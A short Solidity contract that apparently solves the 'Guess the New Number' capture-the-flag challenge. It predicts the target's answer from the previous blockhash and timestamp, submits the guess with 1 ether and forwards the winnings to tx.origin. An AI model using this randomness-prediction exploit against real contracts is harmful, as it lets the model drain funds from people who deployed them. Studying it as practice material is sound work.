pragma solidity ^0.7.4;

interface IGuessTheNewNumberChallenge {
    function isComplete() external view returns (bool);
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberProxy {
    function attack(address _targetAddr) external payable {
        require(msg.value == 1 ether);

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        IGuessTheNewNumberChallenge target = IGuessTheNewNumberChallenge(_targetAddr);

        target.guess{value: 1 ether}(answer);
        
        require(target.isComplete(), "something went wrong");

        tx.origin.transfer(address(this).balance);
    }
    
    receive() external payable {}
}